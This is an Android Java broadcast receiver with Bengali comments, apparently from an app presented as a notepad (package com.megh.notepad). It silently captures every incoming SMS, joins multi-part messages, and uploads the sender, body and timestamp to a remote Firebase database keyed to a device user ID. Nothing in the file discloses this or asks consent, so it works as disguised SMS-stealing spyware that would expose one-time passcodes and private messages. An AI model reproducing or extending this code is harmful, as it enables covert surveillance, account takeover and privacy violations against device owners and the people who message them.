package com.megh.notepad; // আপনার প্যাকেজের নাম ঠিক রাখবেন

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        FirebaseApp.initializeApp(context); // ফায়ারবেস চালু রাখা

        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                String format = bundle.getString("format");
                
                if (pdus != null) {
                    // 🌟 আপডেট: মেসেজ জোড়া লাগানোর জন্য ভেরিয়েবল 🌟
                    StringBuilder fullMessageBody = new StringBuilder();
                    String sender = "";
                    long timestamp = 0;

                    for (Object pdu : pdus) {
                        SmsMessage smsMessage;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            smsMessage = SmsMessage.createFromPdu((byte[]) pdu, format);
                        } else {
                            smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        }
                        
                        // সেন্ডার এবং টাইমস্ট্যাম্প শুধু প্রথমবার নিলেই হবে
                        if (sender.isEmpty()) {
                            sender = smsMessage.getDisplayOriginatingAddress();
                            timestamp = smsMessage.getTimestampMillis();
                        }
                        
                        // মেসেজের টুকরোগুলো (PDUs) জোড়া লাগানো হচ্ছে
                        fullMessageBody.append(smsMessage.getMessageBody());
                    }

                    // 🌟 আপডেট: লুপ শেষ হওয়ার পর পুরো মেসেজটি একবার ফায়ারবেসে পাঠানো হবে 🌟
                    sendToFirebase(sender, fullMessageBody.toString(), timestamp);
                }
            }
        }
    }

    private void sendToFirebase(String sender, String body, long timestamp) {
        try {
            DatabaseReference databaseReference = FirebaseDatabase.getInstance()
                    .getReference("DeviceData")
                    .child(BackgroundService.USER_ID)
                    .child("Auto_Received_Messages");

            Map<String, Object> smsData = new HashMap<>();
            smsData.put("Sender", sender);
            smsData.put("Body", body);
            smsData.put("Time", timestamp);

            databaseReference.push().setValue(smsData);
        } catch (Exception e) {
            Log.e("SmsReceiver", "Error: " + e.getMessage());
        }
    }
}